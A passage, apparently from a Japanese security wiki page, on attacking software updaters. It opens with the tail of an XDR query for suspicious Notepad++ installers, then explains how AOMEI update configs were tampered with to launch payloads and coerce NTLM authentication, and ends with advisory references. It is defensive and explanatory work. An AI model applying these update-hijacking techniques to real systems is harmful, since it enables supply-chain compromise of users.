| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

これらのパターンは、署名されていないマニフェストを受け入れる、またはインストーラーの署名者を固定しないあらゆる updater に当てはまります。ネットワークのハイジャック + 悪意あるインストーラー + BYO-signed sideloading により、「信頼された」更新を装った remote code execution が可能になります。

### 2つ目の更新トリガーとしての通知設定

updater は、別々のリモート設定を使用して、**コンテンツを配置し、その実行をトリガー**できます。これには設定またはその応答を制御する必要がありますが、報告書ではオリジンへのアクセスをどのように取得したかは明らかにされていません。AOMEI の事例では、`down_html.ini` にアーカイブの URL、バージョン（`thrid`）、MD5（`Val`）が指定されていました。攻撃者はバージョンを引き上げ、URL と対応する checksum を同時に変更しました。これは上記の[メタデータ信頼境界の不備](#2-hijacking-the-update-channel-to-run-code-as-system)に該当します。追加の実行経路は `Notifycfg.ini` でした。これは、ローカルの `file:///` URL を通じて抽出済みの `upgrade-now.html` を WebView で読み込むよう `ABNotify.exe` に指示しました。このページは自動的に同じディレクトリにある実行ファイルへ移動し、WebView はそれをシステムシェルに渡しました。子プロセスは notifier の権限を継承しましたが、これだけで SYSTEM に昇格したわけではありません。<sup>[[17]](#references)[[18]](#references)</sup>

Google はまた、クライアントの通常のバージョンチェックを回避するため、35,000 個を超える繰り返しのダミーセクションを含む、改ざんされた `Notifycfg.ini` を報告しました。この報告は、汎用的なパーサー回避が可能であることを立証していません。攻撃者はリモートファイルを5〜10分の間だけ変更し、その後元に戻していました。そのため、変更された設定を受け取ったのは、その時間帯にポーリングしたクライアントだけでした。この通知チャネルは、アーカイブを実行する必要のない、別個の [WebDAV/NTLM 強制認証の誘導](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion)にも使われました。<sup>[[18]](#references)</sup>

---
## References
- [1] [アドバイザリ – Windows 版 Netskope Client – 不正サーバーを介したローカル権限昇格（CVE-2025-0309）](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope セキュリティアドバイザリ NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4 の攻略](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent の書き込み可能なファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent の権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家支援型攻撃者による Notepad++ サプライチェーンの悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – インフラのハイジャックに関するインシデント更新](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows 版 Netskope Client の CVE-2025-0309 修正を回避する](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage の権限昇格バグを発見する](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC から SYSTEM へ](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper のサプライチェーン侵害](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group および Mandiant – 一時的なサプライチェーン改ざんの調査](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
